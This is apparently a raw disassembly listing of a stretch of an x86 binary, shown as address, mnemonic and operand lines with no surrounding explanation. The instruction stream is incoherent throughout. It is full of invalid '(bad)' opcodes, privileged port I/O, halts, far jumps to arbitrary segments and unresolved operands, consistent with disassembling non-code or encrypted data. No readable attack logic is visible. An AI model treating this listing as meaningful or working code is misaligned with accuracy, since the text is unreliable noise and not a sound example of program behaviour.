  40b3a7:	out    dx,al
  40b3a8:	mov    esp,0x6c52625
  40b3ad:	add    al,0xd
  40b3af:	pushw  cs
  40b3b1:	pop    ss
  40b3b2:	cli    
  40b3b3:	cmc    
  40b3b4:	mov    al,0x14
  40b3b6:	and    BYTE PTR [esi],dh
  40b3b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3b9:	push   ss
  40b3ba:	cmp    al,0xee
  40b3bc:	xchg   edx,eax
  40b3bd:	xor    eax,0x3da776cb
  40b3c2:	pusha  
  40b3c3:	cmp    BYTE PTR [esi],ch
  40b3c5:	scas   al,BYTE PTR es:[edi]
  40b3c6:	in     eax,dx
  40b3c7:	mul    ah
  40b3c9:	stos   DWORD PTR es:[edi],eax
  40b3ca:	dec    esp
  40b3cb:	js     0x40b363
  40b3cd:	cdq    
  40b3ce:	cmc    
  40b3cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3d0:	retf   
  40b3d1:	jmp    0xfa20:0x2d1caafe
  40b3d8:	pop    es
  40b3d9:	popf   
  40b3da:	pop    esi
  40b3db:	int    0x88
  40b3dd:	shr    DWORD PTR [ebx+0x577d6daf],1
  40b3e3:	sbb    DWORD PTR [esi+esi*8+0x3d],ebp
  40b3e7:	lock call 0x573696e3
  40b3ed:	cdq    
  40b3ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3ef:	mov    bl,0xb3
  40b3f1:	scas   al,BYTE PTR es:[edi]
  40b3f2:	pop    esi
  40b3f3:	aas    
  40b3f4:	ss nop
  40b3f6:	push   esi
  40b3f7:	outs   dx,BYTE PTR ds:[esi]
  40b3f8:	sub    ecx,DWORD PTR [esi-0x1b]
  40b3fb:	hlt    
  40b3fc:	fs xchg esi,eax
  40b3fe:	xor    eax,0x5566cfff
  40b403:	xchg   BYTE PTR fs:[edi+ebp*2-0x9f20212],bl
  40b40b:	adc    DWORD PTR [ebx],ebp
  40b40d:	js     0x40b3b0
  40b40f:	push   ds
  40b410:	push   esi
  40b411:	arpl   bp,si
  40b413:	rcl    DWORD PTR [ebp+0x26da7706],0xa
  40b41a:	cs jp  0x40b3ed
  40b41d:	fcom   QWORD PTR [bx+di-0x31]
  40b421:	mov    dl,BYTE PTR [edi]
  40b423:	or     eax,0xfdd6d03f
  40b428:	test   eax,0x6929c050
  40b42d:	inc    edx
  40b42e:	retf   
  40b42f:	loope  0x40b3b8
  40b431:	ins    BYTE PTR es:[edi],dx
  40b432:	popa   
  40b433:	xchg   esi,eax
  40b434:	xchg   BYTE PTR [ebx],bh
  40b436:	mov    dl,0x1a
  40b438:	xchg   ch,al
  40b43a:	addr16 push esi
  40b43c:	pop    ds
  40b43d:	cs jp  0x40b45c
  40b440:	adc    ecx,DWORD PTR [eax]
  40b442:	mov    dh,0x30
  40b444:	adc    BYTE PTR [ecx+0x16],0xbd
  40b448:	adc    esi,DWORD PTR [ecx+0x6bc30281]
  40b44e:	in     al,dx
  40b44f:	nop
  40b450:	sahf   
  40b451:	add    al,0x25
  40b453:	jp     0x40b498
  40b455:	sbb    al,0xb8
  40b457:	ds js  0x40b446
  40b45a:	into   
  40b45b:	pop    edi
  40b45c:	shl    DWORD PTR [eax-0x72153256],cl
  40b462:	ins    BYTE PTR es:[edi],dx
  40b463:	push   edi
  40b464:	sub    DWORD PTR [eax-0x78],ebx
  40b467:	(bad)  
  40b468:	outs   dx,BYTE PTR ds:[esi]
  40b469:	inc    ecx
  40b46a:	push   0xffffffdd
  40b46c:	mov    DWORD PTR [esi+0x15],ebx
  40b46f:	imul   ecx,DWORD PTR [ecx+0x1c],0x70d1e773
  40b476:	in     eax,0x4
  40b478:	pop    ds
  40b479:	mov    dh,BYTE PTR [esp+esi*1]
  40b47c:	mov    al,ds:0x30843803
  40b481:	pop    es
  40b482:	xchg   edi,eax
  40b483:	xchg   edx,eax
  40b484:	and    eax,0x24568c50
  40b489:	add    eax,0xede80cdb
  40b48e:	adc    dh,cl
  40b490:	pop    ss
  40b491:	bound  edi,QWORD PTR [edx-0x6a1e6c40]
  40b497:	hlt    
  40b498:	xchg   edi,eax
  40b499:	push   ds
  40b49a:	mov    ecx,0x92a49832
  40b49f:	push   esp
  40b4a0:	inc    edx
  40b4a1:	scas   al,BYTE PTR es:[edi]
  40b4a2:	fmul   st,st(4)
  40b4a4:	cld    
  40b4a5:	jnp    0x40b514
  40b4a7:	xchg   esi,eax
  40b4a8:	cdq    
  40b4a9:	in     al,dx
  40b4aa:	imul   esp,DWORD PTR [edx-0x2b],0xe
  40b4ae:	pop    eax
  40b4af:	sbb    eax,0x684b0a16
  40b4b4:	int3   
  40b4b5:	pushf  
  40b4b6:	call   0xdaf8c47a
  40b4bb:	sub    eax,edi
  40b4bd:	cmp    ecx,DWORD PTR [esi+esi*1]
  40b4c0:	stos   DWORD PTR es:[edi],eax
  40b4c1:	sti    
  40b4c2:	sub    ah,dh
  40b4c4:	mov    ebp,0x52f97b
  40b4c9:	std    
  40b4ca:	xchg   esi,eax
  40b4cb:	mov    ch,0x66
  40b4cd:	(bad)  
  40b4ce:	neg    dl
  40b4d0:	in     al,dx
  40b4d1:	jmp    0x6db95968
  40b4d6:	(bad)  
  40b4d7:	iret   
  40b4d8:	leave  
  40b4d9:	inc    esp
  40b4da:	xchg   BYTE PTR [eax],dl
  40b4dc:	or     ch,dl
  40b4de:	cwde   
  40b4df:	add    BYTE PTR [ebx],ah
  40b4e1:	mov    ds:0x9fdb005f,eax
  40b4e6:	or     DWORD PTR [eax*1+0xbc5267a],ebp
  40b4ed:	cmp    al,0x9b
  40b4ef:	outs   dx,BYTE PTR ds:[esi]
  40b4f0:	mov    ch,0xdc
  40b4f2:	inc    eax
  40b4f3:	mov    ds,WORD PTR [ebp+0x60]
  40b4f6:	pop    eax
  40b4f7:	pushf  
  40b4f8:	fdiv   st(2),st
  40b4fa:	fs push es
  40b4fc:	adc    dl,dl
  40b4fe:	shl    DWORD PTR [edi],1
  40b500:	in     eax,dx
  40b501:	cmc    
  40b502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b503:	nop
  40b504:	in     eax,0x0
  40b506:	lea    ebp,[ebx+0x5a]
  40b509:	pop    ebx
  40b50a:	retf   0xadf8
  40b50d:	mov    ?,WORD PTR [esi+0x4c]
  40b510:	aad    0xa2
  40b512:	xchg   edx,eax
  40b513:	push   ebp
  40b514:	(bad)  
  40b516:	xchg   ecx,eax
  40b517:	sahf   
  40b518:	add    esp,DWORD PTR [ecx+0x25]
  40b51b:	cmp    eax,0x2e5192bf
  40b520:	shr    DWORD PTR [ebp-0x46],0xae
  40b524:	inc    eax
  40b525:	jb     0x40b4e3
  40b527:	sbb    eax,0x5b6bdffe
  40b52c:	rol    DWORD PTR [edx],1
  40b52e:	mov    eax,ds:0x1bce41aa
  40b533:	hlt    
  40b534:	icebp  
  40b535:	popf   
  40b536:	lahf   
  40b537:	test   eax,0xf01a646b
  40b53c:	mov    al,0x23
  40b53e:	lds    edx,FWORD PTR cs:[esi-0x19]
  40b542:	mov    ah,0xe8
  40b544:	lods   al,BYTE PTR ds:[esi]
  40b545:	pop    edx
  40b546:	data16 das 
  40b548:	into   
  40b549:	mov    dh,0xac
  40b54b:	ins    BYTE PTR es:[edi],dx
  40b54c:	mov    BYTE PTR [esi],cl
  40b54e:	and    ch,BYTE PTR [edx+0x4b28025d]
  40b554:	loop   0x40b512
  40b556:	jp     0x40b58d
  40b558:	adc    ax,0xb220
  40b55c:	inc    edi
  40b55d:	dec    ebx
  40b55e:	dec    esp
  40b55f:	in     eax,dx
  40b560:	popf   
  40b561:	xor    dl,BYTE PTR [edi+0x1d]
  40b564:	push   cs
  40b565:	inc    esp
  40b566:	out    dx,al
  40b567:	xor    eax,0xa6e87017
  40b56c:	pop    ss
  40b56d:	retf   0xa4ad
  40b570:	push   0xed422303
  40b575:	push   ecx
  40b576:	outs   dx,BYTE PTR ds:[esi]
  40b577:	fwait
  40b578:	jmp    eax
  40b57a:	mov    BYTE PTR [edx],dh
  40b57c:	jl     0x40b566
  40b57e:	or     eax,0x34fc6aeb
  40b583:	pop    ecx
  40b584:	sbb    cl,bl
  40b586:	jo     0x40b5f4
  40b588:	aad    0x1a
  40b58a:	pop    ecx
  40b58b:	int3   
  40b58c:	jl     0x40b5ed
  40b58e:	sub    edi,DWORD PTR [esi+0x70d2a12d]
  40b594:	sbb    esp,esp
  40b596:	mov    edx,0xa1e74833
  40b59b:	daa    
  40b59c:	xchg   edi,eax
  40b59d:	sub    DWORD PTR [edx-0x1],eax
  40b5a0:	shr    edx,0xc4
  40b5a3:	jb     0x40b580
  40b5a5:	std    
  40b5a6:	or     edx,DWORD PTR [ebx-0x20]
  40b5a9:	cmp    al,0xd9
  40b5ab:	dec    esp
  40b5ac:	in     al,dx
  40b5ad:	ss or  al,0x3d
  40b5b0:	pslld  mm1,QWORD PTR [eax]
  40b5b3:	cs push esi
  40b5b5:	mov    ah,0x7b
  40b5b7:	xchg   ebp,eax
  40b5b8:	clc    
  40b5b9:	jle    0x40b56b
  40b5bb:	inc    ebx
  40b5bc:	pop    ss
  40b5bd:	addr16 dec ebp
  40b5bf:	fcomp  DWORD PTR [edi-0x4ed5732e]
  40b5c5:	lds    ebx,FWORD PTR [edx-0x31a5aea8]
  40b5cb:	add    cl,BYTE PTR [esi-0x31]
  40b5ce:	dec    ecx
  40b5cf:	pusha  
  40b5d0:	lods   al,BYTE PTR ds:[esi]
  40b5d1:	jmp    0x862464a8
  40b5d6:	and    al,0x3c
  40b5d8:	sti    
  40b5d9:	add    ah,0x29
  40b5dc:	popf   
  40b5dd:	scas   al,BYTE PTR es:[edi]
  40b5de:	sub    bh,ch
  40b5e0:	or     dl,cl
  40b5e2:	push   0x4c
  40b5e4:	aad    0x24
  40b5e6:	xor    BYTE PTR [edi+ebx*8],dh
  40b5e9:	scas   eax,DWORD PTR es:[edi]
  40b5ea:	dec    ebx
  40b5eb:	xchg   esi,eax
  40b5ec:	test   BYTE PTR [esi],bh
  40b5ee:	xor    al,0x4
  40b5f0:	(bad)  
  40b5f1:	stos   DWORD PTR es:[edi],eax
  40b5f2:	js     0x40b582
  40b5f4:	ss (bad) 
  40b5f6:	loop   0x40b64f
  40b5f8:	and    al,0x26
  40b5fa:	mov    ch,0x8f
  40b5fc:	adc    eax,0x458d0e0b
  40b601:	popa   
  40b602:	lock into 
  40b604:	mov    edx,0x956bc18a
  40b609:	push   edx
  40b60a:	int3   
  40b60b:	xchg   BYTE PTR [ebp-0x3c],dh
  40b60e:	popf   
  40b60f:	sbb    edi,edx
  40b611:	jns    0x40b655
  40b613:	(bad)  
  40b614:	sbb    DWORD PTR [esi],esi
  40b616:	mov    dl,0x37
  40b618:	dec    ebp
  40b619:	lahf   
  40b61a:	and    DWORD PTR [ecx+0xb],esi
  40b61d:	leave  
  40b61e:	lds    edx,FWORD PTR [eax+0x76]
  40b621:	sbb    BYTE PTR [eax+eax*2-0x4e],ah
  40b625:	scas   al,BYTE PTR es:[edi]
  40b626:	sub    al,0x3e
  40b628:	mov    ch,cl
  40b62a:	xlat   BYTE PTR ds:[ebx]
  40b62b:	push   ds
  40b62c:	repz pop es
  40b62e:	xlat   BYTE PTR ds:[ebx]
  40b62f:	ja     0x40b603
  40b631:	push   0xfffffff0
  40b633:	pop    ecx
  40b634:	out    dx,eax
  40b635:	lods   eax,DWORD PTR ds:[esi]
  40b636:	inc    ecx
  40b637:	out    0x3b,al
  40b639:	mov    al,0xcc
  40b63b:	inc    ecx
  40b63c:	cmp    ebp,DWORD PTR [edi-0x71]
  40b63f:	stc    
  40b640:	cmp    BYTE PTR [ebp-0xf],cl
  40b643:	imul   esp,DWORD PTR [eax-0x411d8120],0xa9db8511
  40b64d:	dec    edi
  40b64e:	rol    dh,1
  40b650:	ins    DWORD PTR es:[edi],dx
  40b651:	jae    0x40b5d3
  40b653:	loop   0x40b62b
  40b655:	ret    0xe913
  40b658:	(bad)  [edi]
  40b65a:	mov    bh,0xe3
  40b65c:	lock (bad) [ebp+ebp*4-0x4c]
  40b661:	mov    ebp,0x78bd9278
  40b666:	rcr    DWORD PTR fs:[ecx],1
  40b669:	js     0x40b5f3
  40b66b:	add    dl,BYTE PTR [ebx-0xff76e2e]
  40b671:	mov    ebp,0xa95c25cd
  40b676:	push   ebp
  40b677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b678:	popa   
  40b679:	and    ebp,DWORD PTR [esi+0x6d71eb2f]
  40b67f:	sti    
  40b680:	ret    
  40b681:	aad    0xc6
  40b683:	cwde   
  40b684:	xchg   edi,eax
  40b685:	pop    eax
  40b686:	(bad)  
  40b687:	scas   eax,DWORD PTR es:[edi]
  40b688:	into   
  40b689:	mov    DWORD PTR [ecx+0x6a8977a0],ebp
  40b68f:	fmul   DWORD PTR [ecx+eax*1]
  40b692:	pop    ebp
  40b693:	sbb    eax,0xf6bb0f42
  40b698:	jbe    0x40b6da
  40b69a:	dec    ecx
  40b69b:	mov    ds:0xc9b2be9a,eax
  40b6a0:	pop    ebx
  40b6a1:	or     ebx,edx
  40b6a3:	iret   
  40b6a4:	add    al,0x42
  40b6a6:	call   0x32158903
  40b6ab:	mov    dl,0x33
  40b6ad:	retf   0xc706
  40b6b0:	pop    ss
  40b6b1:	(bad)  
  40b6b2:	icebp  
  40b6b3:	mov    ebp,0xe2e34754
  40b6b8:	bound  edx,QWORD PTR [eax-0x36]
  40b6bb:	fsub   QWORD PTR ds:0x8ddde544
  40b6c1:	(bad)  
  40b6c2:	and    BYTE PTR [edx-0x2d1be1c3],bh
  40b6c8:	iret   
  40b6c9:	test   BYTE PTR [ebx-0xd],dl
  40b6cc:	in     al,dx
  40b6cd:	call   0x4c9b7dc6
  40b6d2:	dec    edi
  40b6d3:	mov    gs,WORD PTR [ebx+ebx*8]
  40b6d6:	fidivr DWORD PTR [edi]
  40b6d8:	jmp    0xcbc3:0xedfacd1d
  40b6df:	xor    DWORD PTR [ebp-0x2c817ec3],edi
  40b6e5:	xchg   edx,eax
  40b6e6:	je     0x40b6c4
  40b6e8:	fwait
  40b6e9:	mov    esp,0xfd992f3e
  40b6ee:	(bad)  
  40b6ef:	ror    ch,1
  40b6f1:	sub    ecx,DWORD PTR [esi+edx*1]
  40b6f4:	adc    ecx,DWORD PTR [ecx-0x3d]
  40b6f7:	cmp    BYTE PTR [ecx-0x4a7e6153],dl
  40b6fd:	retf   
  40b6fe:	add    BYTE PTR [ebp+0x3ec9e480],bh
  40b704:	sbb    BYTE PTR [ebx],cl
  40b706:	sbb    cl,BYTE PTR [eax]
  40b708:	add    bl,BYTE PTR [eax]
  40b70a:	fistp  DWORD PTR [edx+0x6c]
  40b70d:	sbb    dh,BYTE PTR [esi]
  40b70f:	clc    
  40b710:	mov    esp,0xa7e46984
  40b715:	mov    bl,0x96
  40b717:	mov    ch,0xae
  40b719:	jno    0x40b767
  40b71b:	cmp    eax,0x8852dd3b
  40b720:	repz hlt 
  40b722:	xchg   esi,eax
  40b723:	adc    cl,bh
  40b725:	data16 icebp 
  40b727:	jle    0x40b6fa
  40b729:	or     DWORD PTR [ecx],edi
  40b72b:	and    BYTE PTR [edi-0x1b215448],dl
  40b731:	mov    esp,0x3375a055
  40b736:	loopne 0x40b6f1
  40b738:	push   es
  40b739:	(bad)  
  40b73a:	ficomp WORD PTR [eax+eax*2+0x67]
  40b73e:	xor    al,BYTE PTR [esi-0x5b]
  40b741:	bound  edi,QWORD PTR [edx-0x3d]
  40b744:	imul   ecx,DWORD PTR [esi+0x4d],0xf50c04d5
  40b74b:	jmp    0x14a6:0x1283b13e
  40b752:	leave  
  40b753:	xor    al,0x52
  40b755:	lahf   
  40b756:	fsub   QWORD PTR ds:0x9cc49b58
  40b75c:	dec    eax
  40b75d:	addr16 out 0x8,al
  40b760:	jg     0x40b6ec
  40b762:	shr    DWORD PTR [ecx],cl
  40b764:	push   ebp
  40b765:	pusha  
  40b766:	mov    eax,ds:0xd0d8cb5b
  40b76b:	loope  0x40b72f
  40b76d:	loop   0x40b743
  40b76f:	std    
  40b770:	inc    DWORD PTR [ebp-0x23]
  40b773:	jecxz  0x40b7b1
  40b775:	jnp    0x40b742
  40b777:	jp     0x40b7e0
  40b779:	imul   ebx,DWORD PTR [esi-0x21],0xffffff99
  40b77d:	(bad)  
  40b77e:	shl    DWORD PTR ds:0x107e290f,1
  40b784:	dec    edx
  40b785:	xor    al,0xa
  40b787:	and    edi,0xb36e6716
  40b78d:	xor    DWORD PTR [ebx+0x907a889],esp
  40b793:	std    
  40b794:	jmp    0x40b7bf
  40b796:	aas    
  40b797:	adc    dl,BYTE PTR ds:0xed7e0f2d
  40b79d:	nop
  40b79e:	mov    ds:0xd3edef5a,al
  40b7a3:	pop    esp
  40b7a4:	inc    ebp
  40b7a5:	add    dl,BYTE PTR [esi]
  40b7a7:	sbb    DWORD PTR [ebx-0x54111185],esp
  40b7ad:	jmp    0x40b7fa
  40b7af:	xchg   esp,eax
  40b7b0:	out    0x29,al
  40b7b2:	mov    eax,ds:0xdece1f14
  40b7b7:	into   
  40b7b8:	sbb    esp,eax
  40b7ba:	sub    cl,cl
  40b7bc:	ds jo  0x40b78a
  40b7bf:	dec    ebx
  40b7c0:	pop    es
  40b7c1:	cmc    
  40b7c2:	aas    
  40b7c3:	lods   al,BYTE PTR ds:[esi]
  40b7c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7c5:	xor    esi,DWORD PTR [eax+edi*4]
  40b7c8:	pop    eax
  40b7c9:	mov    dh,0x2a
  40b7cb:	and    bh,BYTE PTR [ebx-0x6b]
  40b7ce:	loop   0x40b7ae
  40b7d0:	mov    ebp,0xf2654e4b
  40b7d5:	adc    ch,bh
  40b7d7:	mov    ebx,0xe4d116fc
  40b7dc:	daa    
  40b7dd:	cmc    
  40b7de:	rcr    BYTE PTR [ebp+0x2098a487],0x84
  40b7e5:	hlt    
  40b7e6:	push   0xa34ef72e
  40b7eb:	pop    ds
  40b7ec:	je     0x40b788
  40b7ee:	dec    esi
  40b7ef:	push   edi
  40b7f0:	addr16 xchg ax,ax
  40b7f3:	sbb    eax,0x59cc5abc
  40b7f8:	mov    WORD PTR [ebp-0x116e8895],?
  40b7fe:	pop    edi
  40b7ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b800:	push   ebp
  40b801:	add    cl,BYTE PTR [ebx]
  40b803:	(bad)  
  40b804:	popf   
  40b805:	dec    esi
  40b806:	cli    
  40b807:	dec    esi
  40b808:	pushf  
  40b809:	jge    0x40b840
  40b80b:	xchg   edi,eax
  40b80c:	loope  0x40b7ec
  40b80e:	ret    
  40b80f:	lods   eax,DWORD PTR ds:[esi]
  40b810:	mov    WORD PTR [ecx-0x27ae4d93],ss
  40b816:	dec    ebp
  40b817:	ror    DWORD PTR [edx+0x2f5b08f],cl
  40b81d:	in     eax,dx
  40b81e:	sbb    eax,0x69cdf38f
  40b823:	into   
  40b824:	mov    esi,0x139573c1
  40b829:	scas   al,BYTE PTR es:[edi]
  40b82a:	push   cx
  40b82c:	icebp  
  40b82d:	in     eax,dx
  40b82e:	ins    DWORD PTR es:[edi],dx
  40b82f:	cmp    ebx,ebx
  40b831:	out    dx,al
  40b832:	lock ret 
  40b834:	in     al,dx
  40b835:	dec    esp
  40b836:	imul   esp,DWORD PTR [edx],0xd938dcdd
  40b83c:	push   esp
  40b83d:	inc    edi
  40b83e:	mov    al,ds:0x89693853
  40b843:	xchg   edi,eax
  40b844:	clc    
  40b845:	pushf  
  40b846:	fimul  DWORD PTR [ebx]
  40b848:	inc    esp
  40b849:	fsub   st,st(2)
  40b84b:	in     eax,dx
  40b84c:	xchg   ebp,eax
  40b84d:	adc    al,BYTE PTR [ecx+0x4c]
  40b850:	mov    gs,WORD PTR [ecx]
  40b852:	mov    ch,0xa4
  40b854:	ja     0x40b7fc
  40b856:	cmp    DWORD PTR [esp+ebp*1],edi
  40b859:	add    al,0x7a
  40b85b:	aad    0x9
  40b85d:	and    edi,ecx
  40b85f:	aam    0x96
  40b861:	dec    ebp
  40b862:	or     DWORD PTR [esi+0x72],0x65697c4e
  40b869:	push   esp
  40b86a:	dec    ebp
  40b86b:	cs push 0xffffffc8
  40b86e:	(bad)  
  40b870:	xchg   ebp,eax
  40b871:	xlat   BYTE PTR ds:[ebx]
  40b872:	int3   
  40b873:	or     al,0x85
  40b875:	outs   dx,DWORD PTR ds:[esi]
  40b876:	fild   QWORD PTR [ecx-0x215944c3]
  40b87c:	lds    esi,FWORD PTR [ebx+0x4f84638]
  40b882:	adc    eax,0x78f93c8c
  40b887:	push   edi
  40b888:	iret   
  40b889:	add    al,0xb4
  40b88b:	or     BYTE PTR [eax+0x44],dl
  40b88e:	or     bh,BYTE PTR ds:0xf915e8e
  40b894:	test   eax,0x46450b8b
  40b899:	jbe    0x40b879
  40b89b:	xor    bl,BYTE PTR ds:0xa50b37b2
  40b8a1:	jnp    0x40b916
  40b8a3:	add    BYTE PTR [esi-0x1fe580cb],dl
  40b8a9:	push   ds
  40b8aa:	out    0xcb,eax
  40b8ac:	push   ss
  40b8ad:	test   al,0xe4
  40b8af:	and    eax,0x7d888483
  40b8b4:	mov    dl,0xba
  40b8b6:	jp     0x40b924
  40b8b8:	dec    edx
  40b8b9:	sub    BYTE PTR [eax-0x16e8408a],bl
  40b8bf:	mov    bh,0xe3
  40b8c1:	and    DWORD PTR [ebx-0x2c00b489],esi
  40b8c7:	lock into 
  40b8c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8ca:	pop    eax
  40b8cb:	cs xchg esp,eax
  40b8cd:	gs je  0x40b91d
  40b8d0:	cmp    eax,0x946e0afb
  40b8d5:	add    DWORD PTR [ecx],esi
  40b8d7:	test   esp,eax
  40b8d9:	cmp    al,BYTE PTR [ecx+0x28d776e]
  40b8df:	mov    esi,0x96747055
  40b8e4:	(bad)  
  40b8e5:	sub    eax,0xa3fa8de8
  40b8ea:	pop    eax
  40b8eb:	loopne 0x40b929
  40b8ed:	fild   WORD PTR [ecx+0x1003a677]
  40b8f3:	cwde   
  40b8f4:	pop    esi
  40b8f5:	repnz pusha 
  40b8f7:	add    BYTE PTR ds:0x8c73751b,bl
  40b8fd:	dec    eax
  40b8fe:	in     eax,0x8f
  40b900:	mov    esi,DWORD PTR [ebp+0x65]
  40b903:	push   es
  40b904:	push   ds
  40b905:	outs   dx,BYTE PTR ds:[esi]
  40b906:	xchg   esp,eax
  40b907:	inc    esi
  40b908:	mov    esp,0x3c418a86
  40b90d:	pop    ebp
  40b90e:	sub    BYTE PTR [ecx-0x5],bh
  40b911:	pop    esp
  40b912:	mov    eax,ds:0x8650df12
  40b917:	pop    esp
  40b918:	and    eax,0xa19e5c85
  40b91d:	es pop ebx
  40b91f:	fdiv   QWORD PTR [edx-0x67]
  40b922:	cdq    
  40b923:	cmp    si,WORD PTR [edx]
  40b926:	ficom  DWORD PTR [edx+ebx*2-0x17]
  40b92a:	arpl   WORD PTR [ebp-0x1b],sp
  40b92d:	sbb    BYTE PTR [ecx-0x6f],dl
  40b930:	adc    DWORD PTR [ebx-0x9092dcb],0xa447b83e
  40b93a:	cld    
  40b93b:	je     0x40b9ba
  40b93d:	xor    bh,BYTE PTR [edx+0x546260ff]
  40b943:	test   eax,0xf1f1d68c
  40b948:	pop    ebp
  40b949:	and    al,0x35
  40b94b:	xchg   ebp,eax
  40b94c:	in     al,0x40
  40b94e:	bound  ecx,QWORD PTR [esi+0x1895893c]
  40b954:	(bad)  
  40b955:	jmp    0xa3d3cb1
  40b95a:	pusha  
  40b95b:	test   BYTE PTR [esi],0xb7
  40b95e:	or     edx,eax
  40b960:	outs   dx,DWORD PTR ds:[esi]
  40b961:	fisubr DWORD PTR [ebx+0x1f]
  40b964:	push   ebx
  40b965:	pop    edx
  40b966:	int    0x97
  40b968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b969:	retf   
  40b96a:	lods   al,BYTE PTR ds:[esi]
  40b96b:	adc    al,0x84
  40b96d:	es jnp 0x40b955
  40b970:	dec    ecx
  40b971:	mov    ebp,0xdff2b46
  40b976:	jl     0x40b99f
  40b978:	xchg   edi,eax
  40b979:	dec    eax
  40b97a:	mov    ds:0x823bbf50,eax
  40b97f:	enter  0xf26,0xe3
  40b983:	test   eax,ebx
  40b985:	ss jmp 0x40ba05
  40b988:	jmp    0xd0713bfb
  40b98d:	jge    0x40ba08
  40b98f:	fdivr  DWORD PTR [ebp-0x5a]
  40b992:	in     al,0xdb
  40b994:	ret    
  40b995:	mov    ds:0x3bffd233,al
  40b99a:	xchg   edi,eax
  40b99b:	xor    DWORD PTR [esp+ebx*8+0x5],ebx
  40b99f:	sti    
  40b9a0:	in     eax,dx
  40b9a1:	ja     0x40ba03
  40b9a3:	mov    esp,0x9991adf9
  40b9a8:	mov    esi,0xd53ed906
  40b9ad:	(bad)  
  40b9ae:	mov    edx,0x2703cf5f
  40b9b3:	fstp   QWORD PTR [eax+0x18]
  40b9b6:	jmp    FWORD PTR [edx]
  40b9b8:	mov    cl,BYTE PTR [esi]
  40b9ba:	jne    0x40b986
  40b9bc:	mov    al,ds:0xad7eb4be
  40b9c1:	outs   dx,BYTE PTR ds:[esi]
  40b9c2:	imul   ebp,esp,0xede4bf3
  40b9c8:	add    BYTE PTR ds:0xb9c4f13,bl
  40b9ce:	out    0xf0,al
  40b9d0:	add    BYTE PTR ds:[esi-0x49],0xd6
  40b9d5:	add    al,0xfe
  40b9d7:	(bad)  
  40b9d8:	jmp    0x1fa7:0xcfbe085c
  40b9df:	jmp    0x9219:0x7d09333e
  40b9e6:	pop    eax
  40b9e7:	and    BYTE PTR [edi+0x4d],0xc7
  40b9eb:	outs   dx,DWORD PTR ds:[esi]
  40b9ec:	out    dx,eax
  40b9ed:	or     al,BYTE PTR [eax]
  40b9ef:	jmp    0x88f22df6
  40b9f4:	mov    bh,0xaf
  40b9f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9f7:	outs   dx,BYTE PTR ds:[esi]
  40b9f8:	jl     0x40ba19
  40b9fa:	out    0xb4,eax
  40b9fc:	xor    al,0x49
  40b9fe:	(bad)  
  40b9ff:	aaa    
  40ba00:	jbe    0x40b993
  40ba02:	stos   DWORD PTR es:[edi],eax
  40ba03:	pop    edi
  40ba04:	mov    al,0xc7
  40ba06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba07:	xor    al,0x3c
  40ba09:	pushf  
  40ba0a:	push   ss
  40ba0b:	cmp    bh,BYTE PTR [edx+0x25d03f74]
  40ba11:	stos   BYTE PTR es:[edi],al
  40ba12:	and    ch,BYTE PTR [edx+0x37]
  40ba15:	rcr    dl,1
  40ba17:	mov    ch,0xcf
  40ba19:	mov    ah,0xea
  40ba1b:	es push es
  40ba1d:	push   esp
  40ba1e:	loope  0x40ba56
  40ba20:	adc    BYTE PTR [edi],ah
  40ba22:	jne    0x40ba2e
  40ba24:	jae    0x40b9bf
  40ba26:	outs   dx,BYTE PTR ds:[esi]
  40ba27:	jp     0x40b9de
  40ba29:	mov    al,BYTE PTR [esi]
  40ba2b:	clc    
  40ba2c:	ret    0x67b7
  40ba2f:	push   ss
  40ba30:	and    al,0x68
  40ba32:	mov    dl,0x1c
  40ba34:	sbb    ebx,DWORD PTR [ebx+0x2]
  40ba37:	jb     0x40b9dc
  40ba39:	xchg   dh,ah
  40ba3b:	fiadd  WORD PTR [bx]
  40ba3e:	pop    ds
  40ba3f:	jb     0x40ba20
  40ba41:	rol    bl,0x9a
  40ba44:	xchg   esp,eax
  40ba45:	(bad)  
  40ba46:	jle    0x40ba0b
  40ba48:	inc    edx
  40ba49:	aam    0xa7
  40ba4b:	pushf  
  40ba4c:	pop    edx
  40ba4d:	popf   
  40ba4e:	or     al,0xdb
  40ba50:	out    dx,eax
  40ba51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba52:	lock xor eax,0x265b88f7
  40ba58:	pusha  
  40ba59:	adc    al,dh
  40ba5b:	sbb    esi,DWORD PTR [eax+0x1]
  40ba5e:	icebp  
  40ba5f:	push   cs
  40ba60:	pop    es
  40ba61:	add    BYTE PTR [edx-0x4b],dl
  40ba64:	push   ebx
  40ba65:	fstp   DWORD PTR [edx-0x4c]
  40ba68:	mov    eax,ds:0x6925cd2f
  40ba6d:	sbb    bl,dh
  40ba6f:	add    ebx,DWORD PTR [eax-0x3b]
  40ba72:	icebp  
  40ba73:	repnz fild WORD PTR [esi]
  40ba76:	xchg   edx,eax
  40ba77:	mov    bh,0x56
  40ba79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba7a:	test   BYTE PTR [edi+eiz*8-0x56],ch
  40ba7e:	mov    edi,0x685f0121
  40ba83:	iret   
  40ba84:	mov    ah,0x3
  40ba86:	pusha  
  40ba87:	aad    0x4a
  40ba89:	xchg   BYTE PTR [edi-0x17],dl
  40ba8c:	mov    dl,bh
  40ba8e:	or     DWORD PTR [ebx-0x220ed9c1],ebp
  40ba94:	dec    ebx
  40ba95:	retf   0xaf2b
  40ba98:	or     dl,cl
  40ba9a:	add    ebp,DWORD PTR [ecx+0x7f6357f9]
  40baa0:	dec    edx
  40baa1:	mov    DWORD PTR [ebp+ebp*8-0xc],edx
  40baa5:	lock push ebp
  40baa7:	sub    BYTE PTR [ebp+0x26],al
  40baaa:	rol    ecx,0xfb
  40baad:	and    bl,ch
  40baaf:	mov    ebp,0xe0754a24
  40bab4:	mov    bl,0xe3
  40bab6:	adc    dl,BYTE PTR [ebp+0x4be735df]
  40babc:	or     bl,BYTE PTR [edx]
